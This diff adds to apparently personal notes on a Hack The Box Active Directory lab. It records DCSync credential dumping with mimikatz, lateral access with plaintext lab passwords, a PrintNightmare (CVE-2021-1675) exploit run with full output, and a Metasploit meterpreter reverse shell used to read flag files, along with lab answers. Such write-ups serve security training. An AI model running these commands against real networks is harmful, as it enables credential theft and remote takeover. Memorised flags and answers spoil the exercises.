@@ -3847,8 +3847,143 @@ Perform a DCSync attack and look for another user with the option "Store passwor
 ```powershell
 Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
 ```
+
+What is this user's cleartext password? 
+```powershell
+runas /netonly /user:INLANEFREIGHT\adunn powershell
+then enter password i got from the previous lab "SyncMaster757"
+Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+
+cd  C:\Tools\mimikatz\x64>
+.\mimikatz.exe
+privilege::debug
+lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\syncron
+```
+
+Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer. 
+
+```powershell
+ lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\khartsfield
+```
 ## Stacking The Deck
 
+### Privileged Access
+
+Get-ADGroupMember -Identity "Remote Management Users" | Select-Object Name, SamAccountName
+
+bloodhound , then i enter this query
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+
+net use \\ACADEMY-EA-DB01\C$ /user:damundsen SQL1234!
+type \\ACADEMY-EA-DB01\C$\Users\damundsen\Desktop\flag.txt
+
+### Bleeding Edge Vulnerabilities 
+
+```bash
+┌─[✗]─[htb-student@ea-attack01]─[/opt/CVE-2021-1675]
+└──╼ $./CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'                                                                                                                                                                         
+[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]
+[+] Bind OK
+[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
+[*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll
+[*] Try 1...
+[*] Stage0: 0
+[*] Try 2...
+[*] Stage0: 0
+[*] Try 3...
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket/smbconnection.py", line 599, in readFile
+    bytesRead = self._SMBConnection.read_andx(treeId, fileId, offset, toRead)
+  File "/usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket/smb3.py", line 1979, in read_andx
+    return self.read(tid, fid, offset, max_size, wait_answer)
+  File "/usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket/smb3.py", line 1316, in read
+    if ans.isValidAnswer(STATUS_SUCCESS):
+  File "/usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket/smb3structs.py", line 458, in isValidAnswer
+    raise smb3.SessionError(self['Status'], self)
+impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_BROKEN(The pipe operation has failed because the other end of the pipe has been closed.)
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/opt/CVE-2021-1675/./CVE-2021-1675.py", line 192, in <module>
+    main(dce, pDriverPath, options.share)
+  File "/opt/CVE-2021-1675/./CVE-2021-1675.py", line 93, in main
+    resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
+  File "/usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket/dcerpc/v5/rprn.py", line 636, in hRpcAddPrinterDriverEx
+    return dce.request(request)
+  File "/usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket/dcerpc/v5/rpcrt.py", line 859, in request
+    answer = self.recv()
+  File "/usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket/dcerpc/v5/rpcrt.py", line 1310, in recv
+    response_data = self._transport.recv(forceRecv, count=MSRPCRespHeader._SIZE)
+  File "/usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket/dcerpc/v5/transport.py", line 550, in recv
+    return self.__smb_connection.readFile(self.__tid, self.__handle)
+  File "/usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket/smbconnection.py", line 605, in readFile
+    raise SessionError(e.get_error_code(), e.get_error_packet())
+impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_BROKEN(The pipe operation has failed because the other end of the pipe has been closed.)
+┌─[✗]─[htb-student@ea-attack01]─[/opt/CVE-2021-1675]
+```
+
+```bash
+┌─[✗]─[htb-student@ea-attack01]─[/tmp]
+└──╼ $sudo smbserver.py -smb2support CompData /home/htb-student/                                                                              
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (172.16.5.5,49896)
+[*] AUTHENTICATE_MESSAGE (\,ACADEMY-EA-DC01)
+[*] User ACADEMY-EA-DC01\ authenticated successfully
+[*] :::00::aaaaaaaaaaaaaaaa
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:CompData)
+[*] Disconnecting Share(1:IPC$)
+[*] Disconnecting Share(2:CompData)
+[*] Closing down connection (172.16.5.5,49896)
+[*] Remaining connections []
+^CTraceback (most recent call last):
+  File "/usr/local/bin/smbserver.py", line 4, in <module>
+    __import__('pkg_resources').run_script('impacket==0.9.24.dev1+20211013.152215.3fe2d73a', 'smbserver.py')
+  File "/usr/lib/python3/dist-packages/pkg_resources/__init__.py", line 651, in run_script
+    self.require(requires)[0].run_script(script_name, ns)
+  File "/usr/lib/python3/dist-packages/pkg_resources/__init__.py", line 1448, in run_script
+    exec(code, namespace, namespace)
+  File "/usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/EGG-INFO/scripts/smbserver.py", line 105, in <module>
+    server.start()
+  File "/usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket/smbserver.py", line 4722, in start
+    self.__server.serve_forever()
+  File "/usr/lib/python3.9/socketserver.py", line 232, in serve_forever
+    ready = selector.select(poll_interval)
+  File "/usr/lib/python3.9/selectors.py", line 416, in select
+    fd_event_list = self._selector.poll(timeout)
+KeyboardInterrupt
+```
+
+```bash
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> use /multi/handler
+[*] Using configured payload windows/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
+LPORT => 8080
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
+LHOST => 172.16.5.225
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
+
+[*] Started reverse TCP handler on 172.16.5.225:8080 
+[*] Sending stage (200262 bytes) to 172.16.5.5
+[*] Meterpreter session 2 opened (172.16.5.225:8080 -> 172.16.5.5:52283 ) at 2025-02-08 11:41:44 -0500
+
+(Meterpreter 2)(C:\Windows\system32) > pwd
+C:\Windows\system32
+(Meterpreter 2)(C:\Windows\system32) > cd ../../Users
+(Meterpreter 2)(C:\Users) > cat Administrator\\Desktop\\DailyTasks\\flag.txt
+D0ntSl@ckonN0P@c!(Meterpreter 2)(C:\Users) > 
+
+```
 ## Why So Trusting?
 
 ## Breaking Down Boundaries
